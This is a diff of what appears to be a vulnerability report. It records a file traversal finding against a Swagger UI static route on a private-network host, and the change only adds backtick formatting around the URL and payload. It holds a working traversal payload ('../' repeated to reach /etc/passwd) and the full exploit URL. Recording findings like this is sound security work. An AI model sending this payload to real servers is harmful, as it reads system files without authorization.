@@ -1,10 +1,10 @@
 Vulnerability: File Traversal via path filename
 
 
-URL: http://172.17.0.12:6767/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd
+URL: ```http://172.17.0.12:6767/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd```
 
 
-Payload: ../../../../../../../../../../../../../../../../etc/passwd
+Payload: ```../../../../../../../../../../../../../../../../etc/passwd```
 
 
 Action to trigger: None
